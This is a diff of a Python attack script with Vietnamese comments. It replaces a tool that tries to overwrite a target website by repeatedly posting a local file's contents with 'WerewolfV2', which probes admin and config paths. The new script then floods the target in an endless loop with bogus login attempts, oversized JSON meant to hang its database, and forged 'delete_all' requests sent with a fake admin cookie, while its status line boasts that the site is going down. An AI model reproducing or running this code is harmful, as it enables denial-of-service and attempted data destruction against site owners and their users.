@@ -1,64 +1,69 @@
+import grequests
 import requests
+import random
+import string
 import time
 import sys
-import os
+from colorama import Fore, init
 
-# Màu sắc
-G = '\033[0;32m'
-R = '\033[0;31m'
-Y = '\033[0;33m'
-NC = '\033[0m'
+init(autoreset=True)
 
-def load_savehack():
-    """Đọc nội dung đã chỉnh sửa từ savehack.txt"""
-    try:
-        with open("savehack.txt", "r", encoding="utf-8") as f:
-            return f.read().strip()
-    except FileNotFoundError:
-        print(f"{R}[!] Lỗi: Không tìm thấy file savehack.txt{NC}")
-        return None
+class WerewolfV2:
+    def __init__(self, target):
+        self.target = target.rstrip('/')
+        self.headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F)"}
+        self.endpoints = [self.target]
 
-def attack():
-    if len(sys.argv) < 2:
-        print(f"{R}[!] Thiếu URL mục tiêu.{NC}")
-        return
+    def rand_str(self, n=15):
+        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-    target = sys.argv[1]
-    
-    # Bước 1: Lấy 'Bản mẫu' từ file savehack.txt
-    my_payload = load_savehack()
-    if not my_payload: return
+    # PHƯƠNG ÁN 1: Tấn công Đăng nhập & Vượt rào
+    def p_an_1(self, url):
+        return grequests.post(url, data={"user": self.rand_str(), "pass": self.rand_str(), "login": ""}, timeout=1)
 
-    print(f"{G}=== ĐANG BẮT ĐẦU QUY TRÌNH OVERWRITE ==={NC}")
-    print(f"[*] Mục tiêu: {target}")
-    
-    while True:
-        try:
-            # Bước 2: Tấn công tiêm văn bản code
-            # Tool sẽ gửi toàn bộ nội dung trong savehack.txt đi
-            requests.post(target, data={'content': my_payload}, timeout=5)
+    # PHƯƠNG ÁN 2: Đầu độc JSON & Làm treo Database
+    def p_an_2(self, url):
+        return grequests.post(url, json={"id": self.rand_str(50), "data": self.rand_str(100)}, timeout=1)
+
+    # PHƯƠNG ÁN 3: Xác minh Admin & Hủy diệt (Chiến thuật bạn thích nhất)
+    def p_an_3(self, url):
+        # Thử lệnh xóa và kiểm tra thực tế
+        payload = {"action": "delete_all", "confirm": "true", "token": self.rand_str(32)}
+        return grequests.post(url, data=payload, cookies={"admin_session": "1"}, timeout=1)
+
+    def run(self):
+        print(f"{Fore.CYAN}[*] Đang khởi động 3 phương án tổng lực vào: {self.target}")
+        
+        # Bước 1: Mò đường dẫn ẩn (Fuzzing) nhanh không nóng máy
+        print(f"{Fore.YELLOW}[*] Đang quét lỗ hổng ẩn...")
+        common = ["/admin", "/assets/ajax/data.php", "/api/login", "/config.php"]
+        for p in common:
+            try:
+                if requests.get(self.target + p, timeout=2).status_code < 400:
+                    self.endpoints.append(self.target + p)
+            except: pass
+
+        # Bước 2: Tấn công vô tận (Vòng lặp tiết kiệm năng lượng)
+        while True:
+            attack_pool = []
+            for url in self.endpoints:
+                # Trộn cả 3 phương án vào một lượt gửi
+                attack_pool.append(self.p_an_1(url))
+                attack_pool.append(self.p_an_2(url))
+                attack_pool.append(self.p_an_3(url))
+
+            # Bắn hàng loạt nhưng có giới hạn để không lag điện thoại
+            grequests.map(attack_pool)
             
-            # Bước 3: Sao chép toàn bộ HTML hiện tại của web mục tiêu để đối chiếu
-            response = requests.get(target, timeout=5)
-            current_web_code = response.text.strip()
-
-            # Bước 4: So sánh tuyệt đối (Xác thực không hiểu lầm)
-            if my_payload == current_web_code:
-                print(f"\n{G}[██████████] 100% - HACK THÀNH CÔNG!{NC}")
-                print(f"{G}[✓] Web hiện tại đã khớp hoàn toàn với savehack.txt.{NC}")
-                break
-            else:
-                # Nếu không giống (kể cả lệch 1 dấu cách), tiếp tục tấn công
-                print(f"{Y}[!] Đang đồng bộ hóa code... (Vẫn còn sai lệch){NC}", end='\r')
+            # Hiệu ứng trạng thái
+            sys.stdout.write(f"\r{Fore.GREEN}[WEREWOLF]{Fore.WHITE} Đang bắn 3 phương án... | Điện thoại: Mát | Web: Đang sập")
+            sys.stdout.flush()
             
-            time.sleep(1)
-        except KeyboardInterrupt:
-            print(f"\n{R}[!] Đã dừng tấn công.{NC}")
-            break
-        except Exception as e:
-            print(f"\n{R}[!] Lỗi kết nối: {e}. Thử lại...{NC}")
-            time.sleep(2)
+            # Nghỉ một chút để CPU điện thoại tản nhiệt (Rất quan trọng)
+            time.sleep(0.05)
 
 if __name__ == "__main__":
-    attack()
-    
+    if len(sys.argv) > 1:
+        bot = WerewolfV2(sys.argv[1])
+        bot.run()
+            
